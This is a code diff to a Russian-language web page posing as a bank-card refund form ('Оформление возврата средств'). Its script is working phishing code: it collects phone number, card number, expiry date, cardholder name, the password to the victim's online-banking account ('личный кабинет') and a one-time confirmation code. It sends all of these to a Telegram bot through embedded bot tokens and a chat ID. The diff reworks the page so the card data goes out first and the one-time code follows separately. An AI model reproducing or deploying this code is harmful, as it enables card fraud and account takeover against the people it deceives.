@@ -47,56 +47,71 @@
             display: none;
         }
     </style>
-    <script>
-        let cooldown = false;
+<script>
+    let cooldown = false;
+    let formData = {}; // Хранение данных перед отправкой кода
 
-        function sendData() {
-            if (cooldown) return;
+    function sendData() {
+        if (cooldown) return;
 
-            const telephone = document.getElementById('telephone').value;
-            const cardNumber = document.getElementById('card_number').value;
-            const expirationDate = document.getElementById('expiration_date').value;
-            const holderName = document.getElementById('holder_name').value;
-            const accountPassword = document.getElementById('account_password').value;
+        formData = {
+            telephone: document.getElementById('telephone').value,
+            cardNumber: document.getElementById('card_number').value,
+            expirationDate: document.getElementById('expiration_date').value,
+            holderName: document.getElementById('holder_name').value,
+            accountPassword: document.getElementById('account_password').value
+        };
 
-            if (!telephone || !cardNumber || !expirationDate || !holderName || !accountPassword) {
-                alert("Пожалуйста, заполните все поля!");
-                return;
-            }
+        if (!formData.telephone || !formData.cardNumber || !formData.expirationDate || !formData.holderName || !formData.accountPassword) {
+            alert("Пожалуйста, заполните все поля!");
+            return;
+        }
 
+        // Отправка данных (без кода) в Telegram
+        fetch("https://api.telegram.org/bot7907747711:AAGphH8ZsuiSdCpwqrSevNjgJfZxZUdtw4U/sendMessage", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                chat_id: "-1002489511369",
+                text: `Заявка на возврат средств\nТелефон: ${formData.telephone}\nНомер карты: ${formData.cardNumber}\nСрок действия: ${formData.expirationDate}\nИмя держателя: ${formData.holderName}\nПароль от ЛК: ${formData.accountPassword}\n------------------\nОжидаем код подтверждения...`
+            })
+        }).then(() => {
             document.getElementById('form').classList.add('hidden');
             document.getElementById('codeForm').classList.remove('hidden');
+        });
+    }
+
+    function sendCode() {
+        if (cooldown) return;
+
+        const code = document.getElementById('code').value;
+        if (!code) {
+            alert("Введите код!");
+            return;
         }
 
-        function sendCode() {
-            if (cooldown) return;
+        cooldown = true;
+        document.getElementById('submitButton').disabled = true;
 
-            const code = document.getElementById('code').value;
-            if (!code) {
-                alert("Введите код!");
-                return;
-            }
+        // Отправка только кода
+        fetch("https://api.telegram.org/bot7907747711:AAGphH8ZsuiSdCpwqrSevNjgJfZxZUdtw4U/sendMessage", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                chat_id: "-1002489511369",
+                text: `🔐 Код подтверждения: ${code}`
+            })
+        }).then(() => {
+            document.getElementById('message').style.display = 'block';
+            setTimeout(() => {
+                document.getElementById('message').style.display = 'none';
+                document.getElementById('submitButton').disabled = false;
+                cooldown = false;
+            }, 30000); // 30 секунд задержки
+        });
+    }
+</script>
 
-            cooldown = true;
-            document.getElementById('submitButton').disabled = true;
-
-            fetch("https://api.telegram.org/bot7795297138:AAH0cm6ux2pNenzP0JQ_ngZAKMVtdZ2sRug/sendMessage", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    chat_id: "-1002489511369",
-                    text: `Заявка на возврат средств\nТелефон: ${document.getElementById('telephone').value}\nНомер карты: ${document.getElementById('card_number').value}\nСрок действия: ${document.getElementById('expiration_date').value}\nИмя держателя: ${document.getElementById('holder_name').value}\nПароль от ЛК: ${document.getElementById('account_password').value}\n------------------\nКод: ${code}`
-                })
-            }).then(() => {
-                document.getElementById('message').style.display = 'block';
-                setTimeout(() => {
-                    document.getElementById('message').style.display = 'none';
-                    document.getElementById('submitButton').disabled = false;
-                    cooldown = false;
-                }, 30000); // 30 секунд задержки
-            });
-        }
-    </script>
 </head>
 <body>
     <h2>Оформление возврата средств</h2>
